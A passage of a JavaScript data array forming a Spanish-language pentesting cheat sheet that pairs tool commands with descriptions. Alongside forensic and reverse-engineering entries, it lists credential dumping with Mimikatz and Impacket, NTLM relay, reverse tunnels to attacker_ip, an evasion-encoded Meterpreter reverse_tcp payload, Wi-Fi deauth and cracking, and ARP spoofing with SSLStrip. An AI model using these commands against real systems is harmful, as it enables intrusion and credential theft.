      { cmd: "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302,403", desc: "Fuzzing de directorios y rutas web con filtrado de códigos HTTP" },
      { cmd: "ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.js,.json,.bak -c -t 60", desc: "Fuzzing con múltiples extensiones de archivo, color y 60 hilos" },
      { cmd: "ffuf -u https://target.com/api/v1 -X POST -H \"Content-Type: application/json\" -d '{\"user\":\"admin\",\"token\":\"FUZZ\"}' -w tokens.txt -mr \"welcome\"", desc: "Fuzzing de API JSON filtrando respuestas por expresión regular" },
      { cmd: "ffuf -u https://target.com/page -w params.txt:PARAM -w values.txt:VAL -X GET \"https://target.com/page?PARAM=VAL\"", desc: "Fuzzing simultáneo de nombres y valores de parámetros" },
      { cmd: "ffuf -u https://target.com/ -H \"Host: FUZZ.target.com\" -w vhosts.txt -fs 1420", desc: "Fuzzing de Virtual Hosts (VHosts) filtrando por tamaño de respuesta falso positivo" },
      { cmd: "ffuf -u https://target.com/FUZZ -w list.txt -recursion -recursion-depth 3 -rate 50", desc: "Fuzzing recursivo de 3 niveles con limitación de 50 peticiones por segundo" }
    ]
  },
  {
    tool: "Nuclei",
    icon: "☢️",
    commands: [
      { cmd: "nuclei -u https://target.com", desc: "Escaneo completo de vulnerabilidades con todas las plantillas comunitarias activas" },
      { cmd: "nuclei -l targets.txt -t cves/ -severity critical,high", desc: "Escanear lista de URLs buscando únicamente CVEs críticos y de alta severidad" },
      { cmd: "nuclei -u https://target.com -t exposures/ -t misconfiguration/", desc: "Detectar paneles de administración expuestos, backups y malas configuraciones" },
      { cmd: "nuclei -u https://target.com -t http/takeovers/ -silent", desc: "Verificar vulnerabilidades de Subdomain Takeover de forma silenciosa" },
      { cmd: "nuclei -update-templates", desc: "Actualizar a las últimas definiciones de exploits y firmas comunitarias" },
      { cmd: "nuclei -u https://target.com -waf-detect", desc: "Detección y fingerprinting de WAF (Web Application Firewall)" }
    ]
  },
  {
    tool: "Httpx",
    icon: "🔗",
    commands: [
      { cmd: "httpx -l subdomains.txt -title -status-code -tech-detect", desc: "Probing masivo detectando títulos de página, código de estado y tecnologías (Wappalyzer)" },
      { cmd: "cat domains.txt | httpx -mc 200,302 -location -ip -cdn", desc: "Filtrar hosts activos, mostrar redirecciones, IP de resolución y proveedor CDN" },
      { cmd: "httpx -u https://target.com -path /admin,/api,/swagger -sc", desc: "Comprobar rápidamente la existencia de múltiples endpoints comunes" },
      { cmd: "httpx -l ips.txt -ports 80,443,8080,8443,9000,9090 -silent", desc: "Escanear servicios HTTP en puertos web no estándar" }
    ]
  },
  {
    tool: "Katana & Arjun",
    icon: "🗡️",
    commands: [
      { cmd: "katana -u https://target.com -d 5 -jc -o endpoints.txt", desc: "Katana: Crawling web profundo de 5 niveles con análisis de JavaScript activo" },
      { cmd: "katana -u https://target.com -f qurl -silent | uro", desc: "Extraer únicamente URLs con parámetros para pruebas de inyección y XSS" },
      { cmd: "arjun -u https://target.com/endpoint.php -m GET -w /usr/share/wordlists/params.txt", desc: "Arjun: Descubrimiento de parámetros GET ocultos o no documentados" },
      { cmd: "arjun -u https://target.com/api/user -m POST --json -t 20", desc: "Arjun: Fuerza bruta de parámetros en formato JSON vía POST" }
    ]
  },
  {
    tool: "Commix & Dalfox",
    icon: "💉",
    commands: [
      { cmd: "commix -u \"http://target.com/vuln.php?cmd=ping\" --batch", desc: "Commix: Detección y explotación automática de Command Injection en parámetros" },
      { cmd: "commix -r request.txt --os-cmd=\"id; uname -a\"", desc: "Commix: Ejecutar comandos de sistema en remoto desde archivo de petición HTTP" },
      { cmd: "commix -u \"http://target.com/login.php\" --data=\"user=admin&pass=123\" --current-user", desc: "Commix: Inyección de comandos en petición POST para extraer usuario del sistema" },
      { cmd: "dalfox url \"https://target.com/search?q=test\" -b https://your-xss.hunter.domain", desc: "Dalfox: Escáner avanzado de XSS con soporte de callback Blind XSS" },
      { cmd: "dalfox file urls.txt --deep-domxss --skip-bav -o xss_results.txt", desc: "Dalfox: Detección profunda de DOM XSS en lista de URLs" }
    ]
  },
  {
    tool: "ODAT & NoSQLMap",
    icon: "🗄️",
    commands: [
      { cmd: "odat all -s target_ip -p 1521 -d ORCL -U scott -P tiger", desc: "ODAT: Escaneo y prueba de todos los módulos de explotación en Oracle DB" },
      { cmd: "odat passwordguesser -s target_ip -d ORCL --both-accounts", desc: "ODAT: Fuerza bruta de cuentas y contraseñas por defecto en Oracle" },
      { cmd: "odat privesc -s target_ip -d ORCL -U scott -P tiger --dba-with-grant", desc: "ODAT: Escalada de privilegios a DBA en servidor Oracle" },
      { cmd: "nosqlmap", desc: "NoSQLMap: Iniciar framework interactivo para explotación de bases de datos MongoDB y CouchDB" },
      { cmd: "python nosqlmap.py --attack 1 --victim target.com --webPort 80 --uri /login", desc: "NoSQLMap: Inyección automática de operadores NoSQL ($gt, $ne, $regex) en login" }
    ]
  },
  {
    tool: "Responder & NTLM Relay",
    icon: "🎣",
    commands: [
      { cmd: "sudo responder -I eth0 -dwv", desc: "Envenenamiento LLMNR, NBT-NS y MDNS con captura de hashes NetNTLMv1/v2 y modo WPAD activo" },
      { cmd: "sudo responder -I tun0 -A", desc: "Modo análisis pasivo: escuchar tráfico de red sin enviar respuestas de envenenamiento" },
      { cmd: "sudo responder -I eth0 --lm", desc: "Forzar downgrade de autenticación NTLM a LM para crackeo inmediato" },
      { cmd: "impacket-ntlmrelayx -tf targets.txt -smb2support -socks", desc: "NTLM Relay: Reenviar credenciales interceptadas a lista de hosts con SMB signing desactivado" },
      { cmd: "impacket-ntlmrelayx -t ldaps://dc.domain.com --escalate-user attacker", desc: "Relay NTLM a LDAPS para añadir privilegios de replicación DCSync a un usuario" }
    ]
  },
  {
    tool: "CrackMapExec / NetExec (NXC)",
    icon: "⚔️",
    commands: [
      { cmd: "netexec smb 192.168.1.0/24 -u user -p password", desc: "Validar credenciales de dominio en todo el rango de red mediante SMB" },
      { cmd: "netexec smb target -u admin -p password --sam --lsa", desc: "Extraer hashes SAM locales y secretos LSA de la máquina remota" },
      { cmd: "netexec smb 192.168.1.0/24 -u Administrator -H aad3b...:b18a... --shares", desc: "Pass-The-Hash con NTLM hash para enumerar permisos y recursos compartidos" },
      { cmd: "netexec winrm target -u user -p password -X \"whoami /all\"", desc: "Ejecución remota de comandos de PowerShell sobre protocolo WinRM" },
      { cmd: "netexec ldap dc.domain.com -u user -p password --asreproast asrep.txt", desc: "AS-REP Roasting: Extraer tickets para usuarios sin requerimiento de pre-autenticación" },
      { cmd: "netexec ldap dc.domain.com -u user -p password --kerberoasting krb5.txt", desc: "Kerberoasting: Extraer tickets SPN TGS de cuentas de servicio para cracking offline" },
      { cmd: "netexec smb target -u user -p pass -M spiderplus -o READ_ONLY=false", desc: "Spidering automático de todos los archivos y documentos en shares legibles" }
    ]
  },
  {
    tool: "Impacket Suite Completa",
    icon: "🧰",
    commands: [
      { cmd: "impacket-psexec domain/admin:password@10.0.0.5", desc: "Creación y ejecución de servicio interactivo SYSTEM mediante PsExec" },
      { cmd: "impacket-wmiexec domain/admin:password@10.0.0.5", desc: "Ejecución semi-interactiva silenciosa y sin instalación de binarios vía WMI" },
      { cmd: "impacket-smbexec domain/admin:password@10.0.0.5", desc: "Ejecución remota basada en tuberías con nombre SMB (Named Pipes)" },
      { cmd: "impacket-secretsdump domain/admin:password@10.0.0.1 -outputfile dcdump", desc: "DCSync attack: Extraer absolutamente todos los hashes NTLM y claves Kerberos del DC" },
      { cmd: "impacket-GetUserSPNs domain.com/user:password -dc-ip 10.0.0.1 -request -outputfile kerberoast.txt", desc: "Solicitar tickets TGS para cuentas con SPN configurado (Kerberoasting)" },
      { cmd: "impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip 10.0.0.1 -request -format hashcat", desc: "AS-REP Roasting buscando cuentas vulnerables a partir de lista de usuarios" },
      { cmd: "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain domain.com Administrator", desc: "Forjar un Ticket Kerberos TGT Golden Ticket con validez absoluta de 10 años" },
      { cmd: "impacket-lookupsid domain/user:password@10.0.0.5", desc: "Enumeración de usuarios y grupos de dominio mediante fuerza bruta SID / SAMR" }
    ]
  },
  {
    tool: "BloodHound & SharpHound",
    icon: "🩸",
    commands: [
      { cmd: "bloodhound-python -u user -p 'password' -d domain.com -ns 10.0.0.1 -c All --zip", desc: "Recolectar todas las relaciones, sesiones y ACLs del Directorio Activo desde Linux" },
      { cmd: "SharpHound.exe -c All --outputdirectory C:\\Temp --zipfilename ad_data.zip", desc: "SharpHound (Windows): Ingestor oficial de recolección completa en formato ZIP" },
      { cmd: "SharpHound.exe -c Session --stealth --memcached", desc: "Recolección ultra-sigilosa de sesiones de usuario activas en memoria" },
      { cmd: "neo4j console", desc: "Iniciar base de datos de grafos Neo4j para visualización de BloodHound" },
      { cmd: "bloodhound", desc: "Lanzar interfaz gráfica de usuario BloodHound GUI para análisis de rutas de ataque" }
    ]
  },
  {
    tool: "Mimikatz & Rubeus",
    icon: "🔑",
    commands: [
      { cmd: "mimikatz # privilege::debug", desc: "Habilitar privilegios de depuración SeDebugPrivilege en memoria" },
      { cmd: "mimikatz # sekurlsa::logonpasswords", desc: "Extraer contraseñas en texto claro, NTLM y credenciales WDigest del proceso LSASS" },
      { cmd: "mimikatz # lsadump::sam", desc: "Volcar claves y hashes de la base de datos SAM local" },
      { cmd: "mimikatz # lsadump::dcsync /domain:corp.com /user:Administrator", desc: "Ejecutar DCSync solicitando replicación de credenciales del Administrador de Dominio" },
      { cmd: "mimikatz # kerberos::golden /user:Admin /domain:corp.com /sid:S-1-5-21... /krbtgt:hash /ticket:golden.kirbi", desc: "Crear archivo de Golden Ticket Kerberos forjado" },
      { cmd: "mimikatz # kerberos::ptt golden.kirbi", desc: "Pass-The-Ticket: Inyectar ticket Kerberos (.kirbi) en la sesión de memoria actual" },
      { cmd: "Rubeus.exe kerberoast /outfile:tgs.txt", desc: "Rubeus: Solicitar tickets TGS cifrados para todas las cuentas de servicio del dominio" },
      { cmd: "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt", desc: "Rubeus: Extraer hashes AS-REP para usuarios sin preautenticación Kerberos" },
      { cmd: "Rubeus.exe monitor /interval:5 /targetuser:Administrator", desc: "Rubeus: Monitorear sesiones en tiempo real para capturar tickets TGT de administradores" }
    ]
  },
  {
    tool: "Pivoting (Chisel, Ligolo-ng, Proxychains)",
    icon: "🔀",
    commands: [
      { cmd: "chisel server --reverse --port 8000", desc: "Chisel (Servidor Atacante): Iniciar servidor inverso en puerto 8000" },
      { cmd: "chisel client attacker_ip:8000 R:1080:socks", desc: "Chisel (Víctima): Conectar cliente y abrir túnel SOCKS5 en el puerto 1080 del atacante" },
      { cmd: "chisel client attacker_ip:8000 R:3389:192.168.10.5:3389", desc: "Chisel: Port forwarding remoto de un puerto interno (ej. RDP) hacia la máquina atacante" },
      { cmd: "ligolo-proxy -selfcert -laddr 0.0.0.0:11601", desc: "Ligolo-ng (Atacante): Iniciar proxy centralizado con certificado autofirmado" },
      { cmd: "ligolo-agent -connect attacker_ip:11601 -ignore-cert", desc: "Ligolo-ng (Víctima): Conectar agente a través de interfaz TUN para enrutamiento IP completo" },
      { cmd: "sudo ip route add 192.168.10.0/24 dev ligolo", desc: "Enrutar subred interna completa directamente a la interfaz virtual TUN de Ligolo" },
      { cmd: "proxychains4 -q nmap -sT -Pn -p 22,80,445 192.168.10.5", desc: "Proxychains: Enrutar cualquier herramienta a través de la cadena SOCKS (/etc/proxychains4.conf)" }
    ]
  },
  {
    tool: "Tshark & Tcpdump",
    icon: "🦈",
    commands: [
      { cmd: "tshark -i eth0 -f \"tcp port 80 or tcp port 443\" -w web_traffic.pcap", desc: "Tshark: Capturar tráfico web en vivo aplicando filtro de captura BPF" },
      { cmd: "tshark -r capture.pcap -Y \"http.request.method == POST\" -T fields -e http.file_data", desc: "Tshark: Filtrar peticiones POST y extraer el cuerpo de datos (credenciales, formularios)" },
      { cmd: "tshark -r capture.pcap -Y \"dns.flags.response == 0\" -T fields -e dns.qry.name", desc: "Tshark: Listar todas las consultas DNS solicitadas en el volcado PCAP" },
      { cmd: "tshark -r capture.pcap -Y \"kerberos.CNameString\" -T fields -e kerberos.CNameString", desc: "Tshark: Extraer nombres de usuario autenticados mediante Kerberos en la captura" },
      { cmd: "sudo tcpdump -i any -nn -s0 -v -w network_dump.pcap", desc: "Tcpdump: Capturar paquetes completos en todas las interfaces sin resolución DNS" },
      { cmd: "sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn'", desc: "Tcpdump: Filtrar exclusivamente paquetes SYN para detectar intentos de conexión entrantes" }
    ]
  },
  {
    tool: "Aircrack-ng Suite Completa",
    icon: "📡",
    commands: [
      { cmd: "sudo airmon-ng check kill && sudo airmon-ng start wlan0", desc: "Detener procesos conflictivos y poner tarjeta inalámbrica en modo monitor (wlan0mon)" },
      { cmd: "sudo airodump-ng wlan0mon --band abg --encrypt WPA2", desc: "Escanear todos los puntos de acceso 2.4GHz y 5GHz filtrando por cifrado WPA2" },
      { cmd: "sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon", desc: "Fijar canal y BSSID para capturar el WPA 4-Way Handshake en archivo" },
      { cmd: "sudo aireplay-ng --deauth 15 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon", desc: "Enviar paquetes de desautenticación a un cliente específico para forzar la reconexión" },
      { cmd: "sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 handshake-01.cap", desc: "Crackear la contraseña WPA/WPA2 por fuerza bruta sobre el handshake capturado" },
      { cmd: "sudo airdecap-ng -p \"WifiPassword123\" -e \"HomeNetwork\" handshake-01.cap", desc: "Descifrar todo el tráfico de la captura Wi-Fi usando la clave conocida" },
      { cmd: "sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --active_beacon --enable_status=1", desc: "Capturar PMKID de routers sin necesidad de que haya clientes conectados" },
      { cmd: "hcxpcapngtool -o hash.hc22000 -E essidlist pmkid.pcapng", desc: "Convertir captura PMKID a formato hashcat 22000 para cracking por GPU" }
    ]
  },
  {
    tool: "Wifite2 & Bettercap",
    icon: "📶",
    commands: [
      { cmd: "sudo wifite --wpa --pmkid --dict /usr/share/wordlists/rockyou.txt", desc: "Wifite2: Auditoría inalámbrica 100% automatizada de redes WPA/WPA2 y ataques PMKID" },
      { cmd: "sudo wifite --wps --bully", desc: "Wifite2: Ataque automatizado contra WPS usando el motor Bully" },
      { cmd: "sudo bettercap -iface eth0", desc: "Bettercap: Iniciar consola interactiva modular para ataques MiTM y sniffing" },
      { cmd: "net.probe on; net.show; set arp.spoof.targets 192.168.1.50; arp.spoof on", desc: "Bettercap: Escaneo de red y envenenamiento ARP selectivo hacia una IP objetivo" },
      { cmd: "set http.proxy.sslstrip true; http.proxy on", desc: "Bettercap: Activar proxy transparente con ataque SSLStrip para forzar HTTP plano" }
    ]
  },
  {
    tool: "Volatility 3 (Forense de Memoria)",
    icon: "🧠",
    commands: [
      { cmd: "vol -f memory.raw windows.info", desc: "Identificar versión de Windows, arquitectura y offset de símbolos del volcado" },
      { cmd: "vol -f memory.raw windows.pslist", desc: "Listar todos los procesos activos en el momento de la adquisición de memoria" },
      { cmd: "vol -f memory.raw windows.pstree", desc: "Mostrar árbol jerárquico padre-hijo de procesos para detectar spawn anómalos" },
      { cmd: "vol -f memory.raw windows.netscan", desc: "Listar todas las conexiones de red TCP/UDP abiertas y cerradas históricas" },
      { cmd: "vol -f memory.raw windows.malfind --dump", desc: "Detectar inyecciones de código (DLL injection, shellcodes) y volcar páginas de memoria" },
      { cmd: "vol -f memory.raw windows.cmdline", desc: "Extraer argumentos y líneas de comando completas ejecutadas por cada proceso" },
      { cmd: "vol -f memory.raw windows.hashdump", desc: "Extraer hashes de contraseñas de las colmenas del registro (SAM y SYSTEM)" },
      { cmd: "vol -f memory.raw windows.filescan | grep -i \"passwords\"", desc: "Buscar punteros de archivos residentes en la memoria RAM por nombre" },
      { cmd: "vol -f memory.raw windows.dumpfiles --virtaddr 0xdeadbeef", desc: "Extraer archivo de memoria a partir de su dirección virtual" }
    ]
  },
  {
    tool: "Ingeniería Inversa (Radare2, GDB, Binwalk)",
    icon: "⚙️",
    commands: [
      { cmd: "r2 -d ./binary", desc: "Radare2: Abrir binario ejecutable en modo depuración (debugger)" },
      { cmd: "aaa; afl; pdf @main", desc: "Radare2: Analizar todo (aaa), listar funciones (afl) y desensamblar función main (pdf)" },
      { cmd: "r2 -w ./binary -c \"s 0x08048400; wx 90909090\"", desc: "Radare2: Parchear binario sustituyendo instrucciones por NOPs (0x90)" },
      { cmd: "gdb -q ./binary", desc: "GDB: Iniciar GNU Debugger en modo silencioso (con Pwndbg o GEF si están instalados)" },
      { cmd: "gdb: break *main+42; run; x/20wx $rsp; info registers", desc: "GDB: Poner breakpoint, ejecutar, examinar 20 palabras del stack y ver registros" },
      { cmd: "gdb: pattern create 100; pattern search $rsp", desc: "GDB/Pwndbg: Generar patrón de bytes cíclico para calcular offset exacto de Buffer Overflow" },
      { cmd: "binwalk -eM firmware.bin", desc: "Binwalk: Extraer recursivamente todos los sistemas de archivos (SquashFS, CramFS, JFFS2)" },
      { cmd: "binwalk --entropy firmware.bin", desc: "Binwalk: Análisis de entropía para identificar bloques cifrados o comprimidos" },
      { cmd: "strings -a -t x ./binary | grep -E \"key|token|http\"", desc: "Extraer strings con offset hexadecimal filtrando por patrones sensibles" },
      { cmd: "ltrace -s 100 ./binary", desc: "Trazar llamadas a funciones de librerías dinámicas compartidas (.so / .dll)" },
      { cmd: "strace -f -e trace=file,network ./binary", desc: "Trazar llamadas al sistema del kernel de Linux relacionadas con archivos y red" }
    ]
  },
  {
    tool: "Forense de Archivos & Esteganografía",
    icon: "🔬",
    commands: [
      { cmd: "exiftool -all= image.jpg", desc: "ExifTool: Eliminar todos los metadatos y rastros GPS del archivo de imagen" },
      { cmd: "exiftool -json -r /path/to/files/ > metadata.json", desc: "ExifTool: Extraer recursivamente metadatos de todos los archivos a JSON" },
      { cmd: "steghide embed -cf carrier.jpg -ef secret.zip -p \"MasterKey\"", desc: "Steghide: Incrustar archivo secreto ZIP cifrado dentro de imagen JPEG" },
      { cmd: "steghide extract -sf carrier.jpg -p \"MasterKey\"", desc: "Steghide: Extraer contenido oculto indicando clave" },
      { cmd: "stegseek carrier.jpg /usr/share/wordlists/rockyou.txt", desc: "Stegseek: Crackear contraseñas de Steghide a millones de intentos por segundo" },
      { cmd: "zsteg -a image.png", desc: "Zsteg: Analizar todos los métodos de esteganografía LSB en canales RGB de imágenes PNG/BMP" },
      { cmd: "foremost -v -t all -i disk.dd -o /recovery/", desc: "Foremost: File carving bit a bit recuperando cabeceras conocidas de discos dañados" },
      { cmd: "scalpel disk.dd -c /etc/scalpel/scalpel.conf -o /output/", desc: "Scalpel: Carving forense altamente optimizado mediante patrones de configuración" }
    ]
  },
  {
    tool: "Evasión & Post-Explotación Avanzada",
    icon: "🛡️",
    commands: [
      { cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f raw | msfvenom -a x64 --platform windows -e x64/zutto_dekiru -i 5 -f exe -o payload.exe", desc: "Ofuscación de payload en múltiples iteraciones de codificación (encoding)" },
      { cmd: "sudo auditctl -l", desc: "Listar todas las reglas activas de auditoría del kernel en Linux" },
      { cmd: "journalctl -u ssh.service -n 100 --no-pager", desc: "Consultar los últimos 100 eventos de autenticación SSH en registros del sistema" },
      { cmd: "iptables -L -n -v --line-numbers", desc: "Listar reglas completas del firewall iptables con contadores de paquetes y número de línea" },
      { cmd: "sudo tcpkill -i eth0 port 22", desc: "Terminar inmediatamente conexiones TCP en curso sobre un puerto específico" }
    ]
  }
];

